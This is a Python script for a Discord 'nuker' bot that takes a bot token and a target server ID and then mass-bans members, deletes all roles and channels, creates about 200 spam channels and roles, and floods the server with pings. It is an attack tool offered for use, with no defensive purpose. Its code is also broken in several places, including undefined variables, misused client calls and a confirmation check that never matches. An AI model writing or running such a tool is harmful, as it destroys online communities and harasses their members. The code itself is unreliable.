import discord
from discord.ext import commands
import asyncio
import sys
import os
from utilities import TOOL_NAME, OWNER_CREDITS, DEFAULT_PING_MESSAGE
from core_nuke import NukeCore

# --- Bot Setup ---
class NukerBot(commands.Bot):
    def __init__(self):
        # Using commands.Bot is slightly more robust for general bot operations
        super().__init__(command_prefix='!', intents=discord.Intents.all())

    async def on_ready(self):
        print("==========================================================")
        print(f"🚀 {TOOL_NAME} Initializing...")
        print(f"🤖 Logged in as: {self.user.top_username}")
        print(f"🛠️ By: {OWNER_CREDITS}")
        print("==========================================================")

# --- Main Execution Logic ---

async def run_nuker_sequence(bot: discord.Client, token: str, guild_id: int):
    """The main asynchronous function coordinating all nuke steps."""
    guild = bot.get_guild(guild_id)
    if not guild:
        print(f"\n❌ ERROR: Could not find Guild ID {guild_id}. Check if the bot is in that server.")
        return

    print("\n********************************************************")
    print(f"🚀 COMMENCING NUKE SEQUENCE on {guild.name}!")
    print("********************************************************\n")

    nuke = NukeCore(bot)

    # --- Step 1: Mass Ban ---
    await nuke.mass_ban(guild)

    # --- Step 2: Mass Destruction (Roles & Channels) ---
    destruction_report = await nuke.mass_destruction(guild)
    print("\n[SYSTEM REPORT] Role/Channel Deletion Summary:")
    for key, report in destruction_report.items():
        print(f"  - {key}: {report}")

    # --- Step 3: Mass Creation (Spam Channels/Roles) ---
    # We create a substantial amount to test the limits.
    spam_count = 200 
    created_names = await nuke.mass_creation(guild, count=spam_count)
    print(f"\n✅ SUCCESSFULLY CREATED {len(created_names)} spam assets.")

    # --- Step 4: Mass Ping Storm ---
    await nuke.mass_ping(guild, DEFAULT_PING_MESSAGE)

    print("\n==========================================================")
    print("✨ ALL CORE NUKE FUNCTIONS EXECUTED! SERVER IS IN CHAOS!")
    print("==========================================================")


def main():
    """Handles CLI interaction and orchestration."""

    bot = NukerBot()

    # Set up the event loop for running asynchronous code
    try:
        asyncio.run(bot.tree.sync()) # Sync any potential commands if we added them later
    except Exception as e:
        print(f"Error setting up bot: {e}")
        return

    while True:
        # Display main menu loop
        print("\n" + "="*50)
        print("QUANTUM NUKER TOOL V1.0")
        print("="*50)
        print(f"⚙️ Tool Name: {TOOL_NAME}")
        print("----------------------------------------")
        print("OPTIONS:")
        print("[N] - Start the full Nuking sequence (Recommended)")
        print("[X] - Exit the application")

        choice = input("Select option (N/X): ").strip().lower()

        if choice == 'n':
            bot.loop.run_until_complete(start_nuke_workflow())
            # After execution, break out of the menu loop or prompt to continue
            print("\nNuking sequence complete. Returning to main menu.")

        elif choice == 'x':
            print("\n[SYSTEM] Exiting Quantum Nuker...")
            break
        else:
            print("[!] Invalid selection. Please try again.")


async def start_nuke_workflow():
    """Collects user inputs and executes the async nuke process."""

    # 1. Get Bot Token (Must be run in an async context)
    token = input("➡️ Enter Discord Bot Token (REQUIRED): ").strip()
    if not token:
        print("[!] Error: Token cannot be empty.")
        return

    # 2. Get Target Guild ID
    while True:
        try:
            guild_id_input = input("➡️ Enter Targeted Guild ID (Numeric): ").strip()
            target_guild_id = int(guild_id_input)
            break
        except ValueError:
            print("[!] Invalid input. Please enter a valid number.")

    # 3. Confirmation Step
    confirmation = input("\n⚠️ WARNING: This will DELETES everything! Proceed? Type 'YES' to confirm destruction: ").strip()
    if confirmation != "yes":
        print("[!] Aborted by user.")
        return

    try:
        # Initialize and run the bot context for this single, powerful operation
        bot.client = discord.Client(intents=discord.Intents.all(), token=token)
        await bot.client.start() # Re-initializes connection with the provided token

        print("\n✅ Connecting to Discord...")
        # Give the connection time and retry if necessary
        await asyncio.sleep(2) 

        # Run the heavy lifting
        await run_nuker_sequence(bot.client, token, target_guild_id)

    except discord.errors.LoginFailure:
        print("\n[FATAL ERROR] Bot Token Invalid! Check your credentials.")
    except Exception as e:
        print(f"\n[UNEXPECTED FATAL ERROR]: {e}")
    finally:
        # Clean up the connection when done
        if hasattr(bot.client, 'loop'):
             await bot.client.close()


if __name__ == "__main__":
    main()
